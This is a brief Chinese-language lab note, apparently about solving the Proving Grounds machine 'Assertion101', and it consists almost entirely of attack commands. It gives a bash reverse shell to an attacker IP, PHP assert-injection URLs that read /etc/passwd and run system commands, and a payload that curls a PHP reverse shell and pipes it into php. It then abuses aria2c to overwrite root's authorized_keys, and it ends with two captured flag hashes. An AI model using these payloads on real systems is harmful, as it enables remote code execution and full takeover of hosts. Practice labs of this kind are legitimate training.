参考资料  
老套路进行信息搜集  
[https://muzec0318.github.io/posts/PG/assertion101.html](https://muzec0318.github.io/posts/PG/assertion101.html)
   

直接丢给ai 让他给我总结
 
注意使用公钥和私钥 进行登录 还是逻辑的牛
   

bash -i \>& /dev/tcp/192.168.45.188/4444 0\>&1
   

admin账号对 用户名是正确的 密码可能是不正确的
    
192.168.134.94
   

payload
 
[http://192.168.134.94/index.php?page='](http://192.168.134.94/index.php?page=') and die(show_source('/etc/passwd')) or '
 
whoami  
[http://192.168.134.94/index.php?page=%27%20and%20die(system(%22whoami%22))%20or%20%27](http://192.168.134.94/index.php?page=%27%20and%20die\(system\(%22whoami%22\)\)%20or%20%27)
      

[http://192.168.45.188/php-reverse-shell.php](http://192.168.45.188/php-reverse-shell.php)
   

[http://192.168.134.94/index.php?page='](http://192.168.134.94/index.php?page=') and die(system("curl [http://192.168.45.188/php-reverse-shell.php](http://192.168.45.188/php-reverse-shell.php) | php")) or '
 
python -c 'import pty; pty.spawn ("/bin/bash")'
   

/usr/bin/aria2c -d /root/.ssh/ -o authorized_keys "[http://192.168.45.188/authorized_keys](http://192.168.45.188/authorized_keys)" --allow-overwrite=true
    
公钥和私钥的使用 制作免秘钥登录
 
[https://blog.csdn.net/jeikerxiao/article/details/84105529](https://blog.csdn.net/jeikerxiao/article/details/84105529)
   

diyige  
7da35e68ab0eb47329e02c0de0b90286
   

dierge  
0b2fbf4616ca3e8f6084adb4146a7883